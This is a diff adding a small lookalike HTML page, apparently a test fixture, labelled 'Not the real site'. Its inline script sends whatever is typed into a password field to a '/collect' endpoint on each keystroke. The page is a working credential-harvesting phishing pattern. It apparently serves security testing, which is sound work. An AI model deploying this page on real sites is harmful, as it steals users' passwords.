@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Not the real site</title>
+<link rel="icon" href="data:,">
+</head>
+<body style="font:15px system-ui;margin:40px">
+<h1>Lookalike page</h1>
+<label for="password">Password</label> <input id="password" type="password">
+<script>
+  // Reports anything typed into the field to the test server.
+  const field = document.getElementById("password");
+  const report = () => fetch("/collect", { method: "POST", body: new URLSearchParams({ password: field.value }) });
+  field.addEventListener("input", report);
+  field.addEventListener("change", report);
+</script>
+</body>
+</html>
